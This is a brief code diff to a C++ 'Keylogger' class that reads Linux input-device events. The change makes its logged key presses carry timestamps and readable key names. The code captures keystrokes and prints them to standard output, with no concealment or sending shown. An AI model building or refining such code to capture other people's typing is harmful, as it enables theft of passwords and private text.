@@ -1,4 +1,5 @@
 #include "Keylogger.hpp"
+#include "Utils.hpp"
 #include <iostream>
 
 Keylogger::Keylogger(const std::string& devicePath)
@@ -27,7 +28,7 @@ void Keylogger::start() {
     }
 
     if (ev.type == EV_KEY && ev.value == 1) { // Key press
-      std::cout << "Key pressed: " << ev.code << std::endl;
+      std::cout << Utils::get_timestamp() << ": Key pressed: " << Utils::keycode_to_string(ev.code) << std::endl;
     }
   }
 }
